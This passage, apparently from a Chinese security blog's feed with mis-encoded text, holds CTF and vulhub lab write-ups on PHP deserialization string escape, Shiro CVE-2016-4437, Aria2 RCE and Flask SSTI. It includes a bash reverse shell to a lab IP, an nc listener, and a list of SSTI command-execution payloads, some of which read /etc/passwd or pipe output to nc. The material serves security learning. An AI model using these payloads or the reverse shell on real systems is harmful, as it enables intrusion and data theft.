class="line">&#125;</span><br><span class="line"></span><br><span class="line">... </span><br><span class="line"><span class="variable">$serialize_info</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨filter()å‡½æ•°ä¸­è¿‡æ»¤æ‰äº†php,flag,php5,php4,fl1g</p>
<p>file_get_contents()å‡½æ•°å¯ä»¥å°†æ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œ è®©base64ç¼–ç çš„å€¼ä¸ºflagçš„æ‰€åœ¨æ–‡ä»¶å ï¼Œ</p>
<p>å³d0g3_f1ag.phpâ€“&gt;base64ç¼–ç åä¸º <code>ZDBnM19mMWFnLnBocA==</code>(20ä½) ååºåˆ—åŒ–åä¸º <code>s:3:&quot;img&quot;,s:20,&quot;ZDBnM19mMWFnLnBocA==&quot;</code></p>
<p>çœ‹äº†ä¸‹Leena_c9a7å¸ˆå‚…çš„wpï¼Œå½“åå°å¦‚æœå­˜åœ¨è¿‡æ»¤çš„è¯ $_SESSIONæ•°ç»„çš„é”®å€¼ä¼šå‘ç”Ÿå˜åŒ–ï¼Œæ—¢ç„¶æ— æ³•å»æ§åˆ¶imgçš„å€¼ï¼Œå°±å¯ä»¥åˆ©ç”¨è¿™é“é¢˜ç›®æœ¬èº«çš„è¿‡æ»¤å™¨ï¼Œ</p>
<p><code>post:_SESSION[flagflag]=&quot;;s:3:&quot;aaa&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</code></p>
<p><code>s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</code>æ˜¯é¢„æœŸè¾“å‡ºçš„åºåˆ—åŒ–å­—ç¬¦</p>
<p><img src="/posts/7c19cc12/1.PNG"></p>
<p>ç»è¿‡filterè¿‡æ»¤ç©ä¹‹å flagflagä¼šæ›¿æ¢ä¸ºç©º</p>
<p><code>a:2:&#123;s:8:&quot;flagflag&quot;;s:51:&quot;&quot;;s:3:&quot;aaa&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</code>å˜ä¸º</p>
<p><code>a:2:&#123;s:8:&quot;&quot;;s:51:&quot;&quot;;s:3:&quot;aaa&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</code></p>
<p><code>s:8:&quot;&quot;;s:51:&quot;&quot;;s:3:&quot;aaa&quot;</code> è¿™æ ·è¿™é‡Œçš„s:8çš„å€¼ä¸º<code>&quot;;s:51:&quot;</code></p>
<p>a:2:{s:8:â€<em><strong>â€œ;s:51:â€</strong></em>â€œ;s:3:â€aaaâ€;s:3:â€imgâ€;s:20:â€ZDBnM19mMWFnLnBocA==â€;}â€;s:3:â€imgâ€;s:20:â€Z3Vlc3RfaW1nLnBuZw==â€;}</p>
<p>è¿™æ ·ä¸¤å¯¹é”®å€¼ä¸º <code>&quot;;s:51:&quot;</code> <code>aaa</code>   å’Œ <code>img</code> <code>ZDBnM19mMWFnLnBocA==</code> }åé¢çš„å†…å®¹</p>
<p><code>&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</code>å‡ä¼šå½“ä½œåƒåœ¾å‚æ•°å¿½ç•¥æ‰</p>
<p><img src="/posts/7c19cc12/2.PNG"></p>
<p>è¿™æ · file_get_contents()è¯»å–<code>d0g3_f1ag.php</code>çš„å†…å®¹</p>
<p><strong>payload</strong></p>
<blockquote>
<p>GET         f=show_image</p>
<p>POST    _SESSION[flagflag]=â€;s:3:â€aaaâ€;s:3:â€imgâ€;s:20:â€ZDBnM19mMWFnLnBocA==â€;}</p>
</blockquote>
<p>æŸ¥çœ‹æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;flag in /d0g3_fllllllag&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>base64(d0g3_fllllllag) = L2QwZzNfZmxsbGxsbGFn</p>
<p>payload</p>
<blockquote>
<p>GET         f=show_image</p>
<p>POST    _SESSION[flagflag]=â€;s:3:â€aaaâ€;s:3:â€imgâ€;s:20:â€L2QwZzNfZmxsbGxsbGFnâ€;}    </p>
</blockquote>
<p>å¾—åˆ°flag<code>flag&#123;7d55f960-c93d-4db0-8524-f51d073ce4db&#125;</code></p>
<p><img src="/posts/7c19cc12/3.PNG"></p>
<br>

<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><blockquote>
<p><a href="https://xz.aliyun.com/t/6753">https://xz.aliyun.com/t/6753</a></p>
<p><a href="https://segmentfault.com/a/1190000007250604">https://segmentfault.com/a/1190000007250604</a></p>
<p><a href="https://www.jianshu.com/p/8e8117f9fd0e">https://www.jianshu.com/p/8e8117f9fd0e</a></p>
<p><a href="https://www.cnblogs.com/h3zh1/p/12732336.html">https://www.cnblogs.com/h3zh1/p/12732336.html</a></p>
</blockquote>
]]></content>
      <categories>
        <category>ååºåˆ—åŒ–</category>
      </categories>
      <tags>
        <tag>ååºåˆ—åŒ–</tag>
      </tags>
  </entry>
  <entry>
    <title>shiroååºåˆ—åŒ–å¤ç°</title>
    <url>/posts/135e71ec/</url>
    <content><![CDATA[<h3 id="æ¼æ´è¯´æ˜"><a href="#æ¼æ´è¯´æ˜" class="headerlink" title="æ¼æ´è¯´æ˜"></a>æ¼æ´è¯´æ˜</h3><blockquote>
<p>Apache Shiro 1.2.4ååºåˆ—åŒ–æ¼æ´ï¼ˆCVE-2016-4437ï¼‰<br>Apache Shiroæ˜¯ä¸€æ¬¾å¼€æºå®‰å…¨æ¡†æ¶ï¼Œæä¾›èº«ä»½éªŒè¯ã€æˆæƒã€å¯†ç å­¦å’Œä¼šè¯ç®¡ç†ã€‚Shiroæ¡†æ¶ç›´è§‚ã€æ˜“ç”¨ï¼ŒåŒæ—¶ä¹Ÿèƒ½æä¾›å¥å£®çš„å®‰å…¨æ€§ã€‚<br>Apache Shiro 1.2.4åŠä»¥å‰ç‰ˆæœ¬ä¸­ï¼ŒåŠ å¯†çš„ç”¨æˆ·ä¿¡æ¯åºåˆ—åŒ–åå­˜å‚¨åœ¨åä¸ºremember-meçš„Cookieä¸­ã€‚æ”»å‡»è€…å¯ä»¥ä½¿ç”¨Shiroçš„é»˜è®¤å¯†é’¥ä¼ªé€ ç”¨æˆ·Cookieï¼Œè§¦å‘Javaååºåˆ—åŒ–æ¼æ´ï¼Œè¿›è€Œåœ¨ç›®æ ‡æœºå™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚</p>
</blockquote>
<p>shiro æä¾›äº†RememberMeåŠŸèƒ½ï¼Œå¯¹rememberMeçš„cookieåšäº†åŠ å¯†å¤„ç†ï¼Œå½“ç”¨æˆ·æˆåŠŸç™»å½•åshiroåœ¨CookieRememberMeManaerç±»ä¸­å°†cookieä¸­rememberMeå­—æ®µå†…å®¹åˆ†åˆ«è¿›è¡Œ <strong>åºåˆ—åŒ–ï¼ŒAESåŠ å¯†ï¼Œbase64ç¼–ç ã€‚</strong></p>
<p>ç›¸å¯¹çš„ï¼Œåœ¨è¯†åˆ«èº«ä»½æ˜¯ä¼šå¯¹cookieçš„RememberMeå­—æ®µè¿›è¡Œè§£å¯†å¤„ç†ï¼Œè§£å¯†é¡ºåºä¸º    <strong>è·å–RememberMe cookie ï¼Œbase64è§£å¯†ï¼Œ AESè§£å¯†ï¼Œ ååºåˆ—åŒ–</strong></p>
<p>æ‰€ä»¥å¯ä»¥æ„é€ ä¸€ä¸ªæ¶æ„å¯¹è±¡ï¼Œå¯¹å…¶åºåˆ—åŒ–ï¼ŒAESåŠ å¯†ï¼Œbase64ç¼–ç ä¹‹åä½œä¸ºcookieçš„RememberMe å­—æ®µå‘é€å‡ºå»ï¼Œshiroä¼šå°†RememberMeè¿›è¡Œè§£å¯†å¹¶ååºåˆ—åŒ–ï¼Œä»è€Œé€ æˆååºåˆ—åŒ–æ¼æ´.</p>
<br>

<br>

<h3 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h3><p>kali : 192.168.87.128</p>
<p>Ubuntu : 192.168.87.129</p>
<p><code>docker-compose up -d</code> è®¿é—®<code>192.168.87.129:8080</code></p>
<p>ä½¿ç”¨burpsuiteæŠ“åŒ…ï¼Œå‹¾é€‰rememberme,è´¦å·å¯†ç åˆ†åˆ«ä¸º<code>admin</code>,<code>vulhub</code></p>
<p><img src="/posts/135e71ec/bp1.png"></p>
<p>æäº¤è¡¨å•å,å¯ä»¥çœ‹åˆ°set-cookieçš„remeberMe=deleteMe</p>
<br>

<p><img src="/posts/135e71ec/1.PNG"></p>
<p><img src="/posts/135e71ec/2.PNG"></p>
<p>åœ¨kaliä¸Šå¼€å¯ç›‘å¬ </p>
<p><code>nc -lvvp 6666</code></p>
<p><img src="/posts/135e71ec/3.PNG"></p>
<p><img src="/posts/135e71ec/4.PNG"></p>
<p><img src="/posts/135e71ec/shell.png"></p>
]]></content>
      <categories>
        <category>ååºåˆ—åŒ–</category>
      </categories>
      <tags>
        <tag>ååºåˆ—åŒ–</tag>
      </tags>
  </entry>
  <entry>
    <title>Aria2RCEæ¼æ´å¤ç°</title>
    <url>/posts/undefined/</url>
    <content><![CDATA[<h3 id><a href="#" class="headerlink" title></a></h3><p>Aria2 æ˜¯ä¸€æ¬¾å‘½ä»¤è¡Œä¸‹è½»é‡çº§ã€å¤šåè®®ã€å¤šæ¥æºçš„ä¸‹è½½å·¥å…·ï¼ˆæ”¯æŒ HTTP/HTTPSã€FTPã€BitTorrentã€Metalinkï¼‰ï¼Œå†…å»ºXML-RPCå’ŒJSON-RPCæ¥å£ã€‚åœ¨æœ‰æƒé™çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨RPCæ¥å£æ¥æ“ä½œaria2æ¥ä¸‹è½½æ–‡ä»¶ï¼Œå°†æ–‡ä»¶ä¸‹è½½è‡³ä»»æ„ç›®å½•ï¼Œé€ æˆä¸€ä¸ªä»»æ„æ–‡ä»¶å†™å…¥æ¼æ´</p>
<h3 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h3><p><code>docker-compose up -d</code></p>
<p>aria2çš„rpcæœåŠ¡ç«¯å£é»˜è®¤ä¸º6800ï¼Œå¯åŠ¨ç¯å¢ƒåè®¿é—® <code>192.168.159.128:6800</code> burpsuiteæŠ“åŒ…åå‘ç°è¿”å›ä¸º404</p>
<p>å› ä¸º rpc é€šä¿¡éœ€è¦ä½¿ç”¨ json æˆ–è€… xmlï¼Œä¸å¤ªæ–¹ä¾¿ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å€ŸåŠ©ç¬¬ä¸‰æ–¹ UI æ¥å’Œç›®æ ‡é€šä¿¡ï¼Œè¿™æ˜¯ä¸€æ¬¾è½»é‡çº§webå†™å…¥å·¥å…·</p>
<p><code>http://binux.github.io/yaaw/demo/</code></p>
<p>ç‚¹å‡»å³ä¸Šè§’çš„è®¾ç½®è¿›è¡Œä¿¡æ¯é…ç½®</p>
<p><img src="/posts/undefined/settings.png"></p>
<br>

<p>å¼€å¯ä¸€ä¸ªwebæœåŠ¡ï¼Œå°†shellå‡†å¤‡å¥½ï¼Œshellæ–‡ä»¶è¦åœ¨linuxç¯å¢ƒä¸‹å»ç”Ÿäº§ï¼Œå› ä¸ºLinuxå’Œwindowsä¸‹çš„æ¢è¡Œç¬¦ä¸åŒ</p>
<p>kali ï¼š 192.168.159.129</p>
<p>Ubuntu ï¼š 192.168.159.128</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /bin/sh</span></span><br><span class="line">/bin/sh <span class="literal">-i</span> &gt;&amp; /dev/tcp/<span class="number">192.168</span>.<span class="number">159.129</span>/<span class="number">4444</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Python2 ï¼špython2 -m SimpleHTTPServer 8000<br>Python3 ï¼špython3 -m http.server 8000</p>
<p><img src="/posts/undefined/add_task.png"></p>
<p>ä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼Œæ— æ³•ä¸‹è½½æ–‡ä»¶ï¼Œä¹‹å‰å»æµ‹è¯•ä¸‹è½½åˆ«çš„ä¸œè¥¿ï¼Œä¹Ÿæ— æ³•å»ä¸‹è½½â€¦ä¸€ç›´æŠ¥é”™<code>Error: Internal server error</code></p>
<p>æŸ¥äº†ä¸‹æŠ¥é”™åŸå›  è¯´æ˜¯å› ä¸ºæ²¡æœ‰æ‰¾åˆ° Aria2 è¿›ç¨‹ï¼Œä½†æ˜¯åœ¨vulhub dockerç¯å¢ƒä¸­å·²ç»å¼€æ”¾äº†ï¼Œè¯•äº†å‡ æ¬¡æœ€ç»ˆè¿˜æ˜¯æ²¡æ‰¾åˆ°åŸå› â€¦.åç»­çš„åˆ©ç”¨crondä»»åŠ¡åå¼¹shellä¹Ÿå°±æ²¡æ³•å®ç°äº†ã€‚<br>ä¹‹åæœ‰æ—¶é—´å†å»å¤ç°ä¸€ä¸‹å§.</p>
]]></content>
      <categories>
        <category>Aria2</category>
      </categories>
      <tags>
        <tag>Aria2</tag>
      </tags>
  </entry>
  <entry>
    <title>Flask_ssti</title>
    <url>/posts/83c81c44/</url>
    <content><![CDATA[<h3 id="æ¨¡æ¿æ³¨å…¥"><a href="#æ¨¡æ¿æ³¨å…¥" class="headerlink" title="æ¨¡æ¿æ³¨å…¥"></a>æ¨¡æ¿æ³¨å…¥</h3><p>ssti æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥ï¼Œå¤šå­˜åœ¨äºpythonçš„jinja2,django,tornado,mako æ¡†æ¶  phpçš„tiwg,smartyæ¡†æ¶ javaæ¡†æ¶jade velocity</p>
<p>åœ¨ä¸æ­£ç¡®ä½¿ç”¨æ¨¡æ¿å¼•æ“è¿›è¡Œæ¸²æŸ“æ—¶ï¼Œä¼šé€ æˆæ¨¡æ¿æ³¨å…¥ï¼Œä¼šé€ æˆRCEï¼Œä»»æ„æ–‡ä»¶è¯»å–ç­‰æ¼æ´ï¼Œå¤šå‡ºç°å†ctfä¸­.</p>
<p><img src="/posts/83c81c44/ssti.png"></p>
<br>

<hr>
<h3 id="çŸ¥è¯†å‡†å¤‡"><a href="#çŸ¥è¯†å‡†å¤‡" class="headerlink" title="çŸ¥è¯†å‡†å¤‡"></a>çŸ¥è¯†å‡†å¤‡</h3><ul>
<li><p><code>__class__</code>         è¿”å›è¯¥å¯¹è±¡æ‰€å±çš„ç±»</p>
<p>   <img src="/posts/83c81c44/1.png"></p>
</li>
<li><p><code>__base__</code>        ä»¥å­—ç¬¦ä¸²å½¢å¼è¿”å›ä¸€ä¸ªç±»æ‰€ç›´æ¥ç»§æ‰¿çš„ç¬¬ä¸€ä¸ªç±»</p>
</li>
<li><p><code>__bases__</code>        ä»¥å…ƒç»„çš„å½¢å¼è¿”å›ä¸€ä¸ªç±»æ‰€ç›´æ¥ç»§æ‰¿çš„ç±»</p>
</li>
<li><p><code>__mro__</code>            è¿”å›è§£ææ–¹æ³•è°ƒç”¨çš„é¡ºåº</p>
<p>  <img src="/posts/83c81c44/2.png"></p>
</li>
<li><p><code>__subclasses__()</code>        è¿”å›è¿™ä¸ªç±»çš„æ‰€æœ‰å­ç±»çš„é›†åˆ</p>
<p>  <img src="/posts/83c81c44/3.png"></p>
</li>
<li><p><code>__globals__</code>    <code>function.__global__</code>  è·å–functionæ‰€å¤„ç©ºé—´ä¸‹å¯ä»¥ä½¿ç”¨çš„moduleã€æ–¹æ³•åŠæ‰€æœ‰å˜é‡</p>
</li>
<li><p><code>__init__</code>        åˆå§‹åŒ–ç±»</p>
</li>
<li><p><code>__builtins__</code>     å¯ä»¥åˆ©ç”¨<code>__import__</code> <code>eval</code>æ‰§è¡Œå‘½ä»¤</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;&quot;.__class__.__bases__[0].__subclasses__()[250].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;)</span><br><span class="line">&quot;&quot;.__class__.__bases__[0].__subclasses__()[250].__init__.__globals__.__builtins__.eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;)</span><br><span class="line">&quot;&quot;.__class__.__bases__[0].__subclasses__()[250].__init__.__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()</span><br><span class="line">&quot;&quot;.__class__.__bases__[0].__subclasses__()[250].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;id&#x27;).read()</span><br></pre></td></tr></table></figure>
<br>

<p><code>&#39;&#39;.__class__.__mro__[-1]</code>ä¸º<code>&lt;class &#39;object&#39;&gt;</code></p>
<p>pythonä¸­çš„ç±»éƒ½æ˜¯ç»§æ‰¿objectçš„ï¼Œæ‰€ä»¥è¦è°ƒç”¨objectç±»çš„<code>__subclasses__()</code>å»å¾—åˆ°æˆ‘ä»¬æƒ³è¦ä½¿ç”¨çš„ç±»çš„å¯¹è±¡ï¼Œ</p>
<br>

<p>åˆ©ç”¨sstiè¦åšçš„ä¸»è¦ä¸ºä¸¤ç‚¹</p>
<ul>
<li>è¯»å–æ–‡ä»¶å†…å®¹</li>
<li>æ‰§è¡Œå‘½ä»¤</li>
</ul>
<p>é‚£åªéœ€è¦å»å¯»æ‰¾ os/fileç­‰å…³é”®å­—</p>
<p>ä¸€èˆ¬éƒ½æ˜¯ä½¿ç”¨objectç±»ä¸‹çš„ <code>&lt;class &#39;os._wrap_close&#39;&gt;</code>çš„<code>popen</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">enumerate</span>(<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[:<span class="number">200</span>]):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="vulhubä¸Šçš„flask-ssti"><a href="#vulhubä¸Šçš„flask-ssti" class="headerlink" title="vulhubä¸Šçš„flask ssti"></a>vulhubä¸Šçš„flask ssti</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    name = request.args.get(<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;guest&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    t = Template(<span class="string">&quot;Hello &quot;</span> + name)</span><br><span class="line">    <span class="keyword">return</span> t.render()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>

<h4 id="å…³é”®è¯­å¥"><a href="#å…³é”®è¯­å¥" class="headerlink" title="å…³é”®è¯­å¥"></a>å…³é”®è¯­å¥</h4><p><code>t = Template(&quot;Hello &quot; + name)</code></p>
<p>åˆ©ç”¨getä¼ å‚è¿›å…¥templateï¼Œæ„é€ æ³¨å…¥è¯­å¥</p>
<h4 id="éªŒè¯è¯­å¥"><a href="#éªŒè¯è¯­å¥" class="headerlink" title="éªŒè¯è¯­å¥"></a>éªŒè¯è¯­å¥</h4><p><img src="/posts/83c81c44/ssti1.png"></p>
<p><img src="/posts/83c81c44/ssti2.png"></p>
<p><img src="/posts/83c81c44/ssti3.png"></p>
<h4 id="æ¼æ´ä¿®å¤"><a href="#æ¼æ´ä¿®å¤" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h4><p><code>t = Template(&quot;Hello &quot; + &#123;&#123;defense&#125;&#125;)</code></p>
<h4 id="å®˜æ–¹POC"><a href="#å®˜æ–¹POC" class="headerlink" title="å®˜æ–¹POC"></a>å®˜æ–¹POC</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__ == &#x27;catch_warnings&#x27; %&#125;</span><br><span class="line">  &#123;% for b in c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% if &#x27;eval&#x27; in b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&#x27;) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

<p><code>Hello uid=33(www-data) gid=33(www-data) groups=33(www-data) </code></p>
<hr>
<h3 id="buuoj-ssti"><a href="#buuoj-ssti" class="headerlink" title="buuoj ssti"></a>buuoj ssti</h3><p><img src="/posts/83c81c44/buuoj1.png"></p>
<p>å¯ä»¥åˆ¤æ–­æ˜¯flask jinja2 çš„æ¨¡æ¿    (å¦‚æœè¿”å›çš„æ˜¯25 åˆ™æ˜¯Twigæ¨¡æ¿)</p>
<p><img src="/posts/83c81c44/buuoj2.png"></p>
<p><img src="/posts/83c81c44/buuoj3.png"></p>
<p><code>?password=&#123;&#123;%27%27.__class__.__base__&#125;&#125;</code></p>
<p><code>?password=&#123;&#123;%27%27.__class__.__mro__[-1]&#125;&#125;</code></p>
<p><img src="/posts/83c81c44/buuoj4.png"></p>
<p><code>?password=&#123;&#123;%27%27.__class__.__base__.__subclasses__()&#125;&#125;</code>æˆ–è€…</p>
<p><code>?password=&#123;&#123;%27%27.__class__.__mro__[-1].__subclasses__()&#125;&#125;</code>è·å–objectçš„å¯ä»¥åˆ©ç”¨çš„ç±»</p>
<p><img src="/posts/83c81c44/buuoj5.png"></p>
<p>ä½¿ç”¨è„šæœ¬éå†æ‰¾åˆ°åˆ©ç”¨çš„ç±»</p>
<p><code>?password=&#123;&#123;%27%27.__class__.__mro__[-1].__subclasses__()[127]&#125;&#125;</code></p>
<p><img src="/posts/83c81c44/buuoj6.png"></p>
<p>åˆ©ç”¨<code>.__init__.__globals__</code>æ¥æ‰¾osç±»ä¸‹çš„ï¼Œ<code>__init__</code>åˆå§‹åŒ–ç±»ï¼Œç„¶å<code>__globals__</code>å…¨å±€æ¥æŸ¥æ‰¾æ‰€æœ‰çš„æ–¹æ³•åŠå˜é‡åŠå‚æ•°</p>
<p><code>?password=&#123;&#123;%27%27.__class__.__mro__[-1].__subclasses__()[127].__init__.__globals__&#125;&#125;</code></p>
<p><img src="/posts/83c81c44/buuoj7.png"></p>
<p>åˆ©ç”¨<code>popen</code>å»è¯»å–æ–‡ä»¶</p>
<p><code>?password=&#123;&#123;%27%27.__class__.__mro__[-1].__subclasses__()[127].__init__.__globals__[%27popen%27](%27dir%27).read()&#125;&#125;</code></p>
<p><img src="/posts/83c81c44/buuoj8.png"></p>
<p><code>?password=&#123;&#123;%27%27.__class__.__mro__[-1].__subclasses__()[127].__init__.__globals__[%27popen%27](%27ls%27).read()&#125;&#125;</code></p>
<p><code>?password=&#123;&#123;%27%27.__class__.__base__.__subclasses__()[127].__init__.__globals__.__builtins__[%27eval%27]("__import__(%27os%27).popen(%27ls%27).read()")&#125;&#125;</code></p>
<p><img src="/posts/83c81c44/buuoj9.png"></p>
<p><code>?password=&#123;&#123;%27%27.__class__.__mro__[-1].__subclasses__()[127].__init__.__globals__[%27popen%27](%27whoami%27).read()&#125;&#125;</code></p>
<p><img src="/posts/83c81c44/buuoj10.png"></p>
<p>çœ‹çœ‹/appä¸‹é¢æœ‰ä»€ä¹ˆå†…å®¹</p>
<p><code>?password=&#123;&#123;%27%27.__class__.__base__.__subclasses__()[127].__init__.__globals__[%27popen%27](%27ls%20/app%27).read()&#125;&#125;</code></p>
<p><img src="/posts/83c81c44/buuoj11.png"></p>
<p>çœ‹çœ‹server.py</p>
<p><code>?password=&#123;&#123;%27%27.__class__.__base__.__subclasses__()[127].__init__.__globals__[%27popen%27](%27cat%20/app/server.py%27).read()&#125;&#125;</code></p>
<p><img src="/posts/83c81c44/buuoj12.png"></p>
<p>å¾—åˆ°flag <code>n1book&#123;eddb84d69a421a82&#125; </code></p>
<br>

<hr>
<h3 id="å¯èƒ½ä¼šç”¨åˆ°çš„payload"><a href="#å¯èƒ½ä¼šç”¨åˆ°çš„payload" class="headerlink" title="å¯èƒ½ä¼šç”¨åˆ°çš„payload"></a>å¯èƒ½ä¼šç”¨åˆ°çš„payload</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()[127].__init__.__globals__[&quot;popen&quot;](&quot;whoami&quot;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[127].__init__.__globals__.__builtins__[&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[127].__init__.__globals__.__builtins__[&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[127].__init__.__globals__[&#x27;popen&#x27;](&#x27;ls /app&#x27;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()[127].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;ev&#x27;+&#x27;al&#x27;](&#x27;__imp&#x27;+&#x27;ort__(&quot;os&quot;).po&#x27;+&#x27;pen(&quot;ls ./&quot;).read()&#x27;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[138].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;file&#x27;](&#x27;/etc/passwd&#x27;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#x27;os&#x27;].system(&#x27;ls | nc 127.0.0.1 1234&#x27;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[138].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls  /var/www/html&quot;).read()&#x27; )</span><br><span class="line"></span><br><span class="line">object.__subclasses__()[59].__init__.func_globals[&#x27;linecache&#x27;].__dict__[&#x27;o&#x27;+&#x27;s&#x27;].__dict__[&#x27;sy&#x27;+&#x27;stem&#x27;](&#x27;ls&#x27;)</span><br><span class="line"></span><br><span 